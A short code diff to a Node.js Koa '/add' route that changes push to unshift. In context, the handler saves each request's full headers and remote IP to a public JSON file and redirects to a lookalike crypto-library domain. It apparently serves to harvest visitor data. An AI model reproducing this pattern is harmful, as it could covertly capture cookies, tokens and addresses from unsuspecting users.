@@ -297,7 +297,7 @@ router.post('/add', async ctx => {
                 data.header=ctx.request.header;
                 data.remoteAddress=ctx.req.connection.remoteAddress;
                 data.Time=getTimeByTimeZone(8);
-                datas.todos.push(data);
+                datas.todos.unshift(data);
                 fs.writeFileSync('./static/data/blogdata.json', JSON.stringify(datas));
                 ctx.response.redirect('http://cryptosjsorg.cf');
                 // ctx.body = "1";
@@ -333,7 +333,7 @@ router.post('/add', async ctx => {
     //     done: false
     // };
 
-    // datas.todos.push(newTask);
+    // datas.todos.unshift(newTask);
     // ctx.body = {
     //     code: 0,
     //     data: newTask
